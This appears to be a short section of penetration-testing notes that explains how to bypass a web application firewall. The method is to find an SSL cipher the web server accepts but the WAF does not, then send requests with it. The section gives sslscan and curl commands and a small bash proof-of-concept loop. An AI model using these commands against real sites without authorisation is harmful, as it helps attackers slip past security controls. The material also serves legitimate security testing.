#### 2.1. About

1. identify SSL ciphers supported by the web-server
```
# sslscan http://target/ | grep Accept
```

2. compare web-server ciphers with the documented WAF ciphers (if possible)
```
Accepted TLSv1 256 bits ECDHE-RSA-AES256-SHA
```
Note: supported by web-server but not the WAF

3. WAF bypass

```
# curl --ciphers ECDHE-RSA-AES256-SHA https://site.com/lol
```

4. blackbox testing is also possible by trying all possible SSL ciphers


#### 2.2. Concept
- setup: `[the Internet] -> [WAF] -> [web-server]`
- use an unsupported (by the WAF) SSL cipher, but supported by the web-server


#### 2.3. PoC script
```
# domain='https://example.com' 
# for i in `sslscan $domain | grep Accept | awk '{print $5}'`
do 
    echo -n $i ": "; curl -sSL --ciphers "$i" $domain | md5sum
done
```
